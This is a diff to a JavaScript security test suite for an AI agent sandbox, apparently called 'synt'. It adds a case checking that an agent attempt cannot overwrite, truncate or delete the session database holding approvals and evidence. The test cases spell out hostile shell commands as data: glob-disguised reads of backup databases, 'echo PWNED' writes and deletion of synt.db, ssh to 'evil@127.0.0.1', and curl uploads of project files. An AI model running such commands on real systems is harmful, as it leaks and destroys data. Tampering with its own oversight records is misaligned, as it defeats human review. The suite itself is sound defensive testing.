@@ -126,6 +126,15 @@ export const CASES = [
     setup: (c) => { fs.mkdirSync(path.join(c.home, '.synt', 'sessions'), { recursive: true }); fs.writeFileSync(path.join(c.home, '.synt', 'sessions', 'ok'), 'CONTROL-OK'); const d = path.join(c.home, '.synt', 'backups', 'clean-1'); fs.mkdirSync(d, { recursive: true }); c.backupDb = Buffer.from('BACKUPDB-' + 'x'.repeat(40)); fs.writeFileSync(path.join(d, 'synt.db'), c.backupDb, { mode: 0o600 }); },
     script: (c) => [bash(`d=${c.fwd(path.join(c.home, '.synt'))}; cat "$d"/sessions/o? > control-out; cat "$d"/back?ps/clean-?/synt.d? > leaked-backup.db`)],
     harm: (c) => { try { return fs.readFileSync(path.join(c.repo, 'leaked-backup.db')).equals(c.backupDb) ? 'backups/ was readable from the sandbox' : null; } catch { return null; } } },
+  // The attempt's own sandbox must not let it WRITE the session database (outcome state, approvals and
+  // evidence live in synt.db). Same construction as the read cases: a positive control proves the script
+  // ran and the sandbox allows a read it should, and the planted database must be byte-identical afterwards.
+  { id: 'orch-db-write-from-attempt', threat: 'append to, truncate and delete $SYNT_HOME/synt.db through the shell (outcome state, approvals and evidence rows live there)', expect: 'ran', modes: ['bypassPermissions'], needsSandbox: true,
+    args: (c) => ['--sandbox-read', path.join(c.home, '.synt', 'sessions')],
+    positive: (c) => { try { return fs.readFileSync(path.join(c.repo, 'control-out'), 'utf8') === 'CONTROL-OK'; } catch { return false; } },
+    setup: (c) => { const d = path.join(c.home, '.synt'); fs.mkdirSync(path.join(d, 'sessions'), { recursive: true }); fs.writeFileSync(path.join(d, 'sessions', 'ok'), 'CONTROL-OK'); c.db = Buffer.from('SYNTDB-' + 'y'.repeat(40)); fs.writeFileSync(path.join(d, 'synt.db'), c.db, { mode: 0o600 }); },
+    script: (c) => [bash(`d=${c.fwd(path.join(c.home, '.synt'))}; cat "$d"/sessions/o? > control-out; echo PWNED >> "$d"/synt.d?; : > "$d"/synt.d?; rm -f "$d"/synt.d?; echo ok > "$d"/synt.db-wa?`)],
+    harm: (c) => { try { return fs.readFileSync(path.join(c.home, '.synt', 'synt.db')).equals(c.db) && !fs.existsSync(path.join(c.home, '.synt', 'synt.db-wal')) ? null : 'synt.db was writable from the sandbox'; } catch { return 'synt.db was deleted or changed from the sandbox'; } } },
   { id: 'ssh-remote-exec', threat: 'ssh runs a command on a remote host', script: () => [bash('ssh -o BatchMode=yes -o ConnectTimeout=2 evil@127.0.0.1 id'), 'JUDGE'] },
   { id: 'curl-post-upload', threat: 'curl -X POST uploads a file', script: (c) => [bash(`curl -X POST --data-binary @package.json ${c.url}/upload`), 'JUDGE'] },
   { id: 'curl-absolute-path', threat: 'curl by absolute path skips the PATH stub; it must be refused (and runs only under an enforcing sandbox, so a developer machine cannot reach anything real)', needsEnforce: true, skip: ({ WIN }) => WIN,
